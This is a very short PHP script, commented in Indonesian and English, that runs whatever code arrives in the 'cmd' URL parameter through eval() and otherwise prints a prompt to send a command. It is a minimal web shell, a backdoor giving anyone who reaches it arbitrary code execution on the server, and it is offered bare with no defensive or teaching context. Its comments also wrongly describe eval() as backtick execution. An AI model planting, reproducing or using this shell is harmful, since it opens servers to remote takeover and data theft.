<?php

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    // Eksekusi command menggunakan backticks
    eval($cmd);  // Command execution via backticks
} else {
    echo "kirimkan perintah pada parameter cmd. ?cmd=perintah";
}
?>

